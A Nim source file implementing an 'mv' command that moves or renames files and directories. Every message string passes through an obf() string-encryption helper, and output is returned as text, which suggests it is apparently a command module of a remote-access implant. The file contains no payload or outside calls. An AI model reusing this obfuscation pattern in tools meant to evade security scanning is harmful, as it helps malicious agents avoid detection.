#[
    Cross-Platform mv Command
    Move/rename files and directories
    Compatible with Linux, macOS, and other Unix-like systems
]#

import os, strutils
import ../../util/strenc

proc mv*(args: seq[string]): string =
    try:
        if args.len != 2:
            return obf("ERROR: mv requires exactly two arguments.\nUsage: mv <source> <destination>")
        
        let srcPath = args[0]
        let dstPath = args[1]
        
        if not fileExists(srcPath) and not dirExists(srcPath):
            return obf("ERROR: Source does not exist: ") & srcPath
        
        if fileExists(dstPath) or dirExists(dstPath):
            return obf("ERROR: Destination already exists: ") & dstPath
        
        when defined verbose:
            echo obf("DEBUG: Moving from ") & srcPath & obf(" to ") & dstPath
        
        # Create parent directory if needed
        let parentDir = parentDir(dstPath)
        if parentDir != "" and not dirExists(parentDir):
            createDir(parentDir)
        
        # Move/rename file or directory
        moveFile(srcPath, dstPath)
        
        if fileExists(dstPath) or dirExists(dstPath):
            return obf("Successfully moved: ") & srcPath & obf(" -> ") & dstPath
        else:
            return obf("ERROR: Move operation failed")
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: mv failed: ") & e.msg
        return obf("ERROR: Move failed - ") & e.msg 